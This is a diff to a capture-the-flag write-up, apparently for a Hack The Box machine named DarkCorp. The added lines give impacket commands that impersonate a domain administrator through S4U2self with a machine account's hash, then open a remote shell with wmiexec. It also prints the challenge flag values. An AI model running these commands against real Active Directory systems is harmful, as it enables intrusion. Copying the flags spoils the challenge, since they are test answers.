@@ -128,7 +128,7 @@ Reset Account Lockout Counter: 30 minutes
 ```
 
 
--> make a password list with minimum pass. length is 7 max. 12 ; or just extract it from rockyou ;
+-> make a password list with minimum pass. length is 7 max. 12 ; or just extract it from rockyou ; [Custom_rockyou.py](Custom_rockyou.py.md)
 
 Transfer KErbrute and the custom_rockyou file to the Victim Machine ! 
 
@@ -221,3 +221,26 @@ root.txt : fcef13756501763e4c4c13468c6c99d8
 ```
 
 
+![](Root_dark.png)
+
+
+USER ATTACK ! IF we get MACHINE_ACCOUNT --> 
+
+
+``` impersonate_s4uself
+impacket-getST -self 'DARKCORP.HTB/WEB-01$' -altservice 'cifs/web-01.darkcorp.htb' -dc-ip 172.16.20.1 -impersonate administrator -hashes '8f33c7fc7ff515c1f358e488fbb8b675:8f33c7fc7ff515c1f358e488fbb8b675'
+```
+
+
+```user.txt
+export KRB5CCNAME=administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache 
+
+
+impacket-wmiexec darkcorp.htb/administrator@web-01.darkcorp.htb -k -no-pass -dc-ip 172.16.20.1
+
+d84944725036fd8a17e7e080adb27221
+```
+
+
+
+![](User-darkcorp.png)
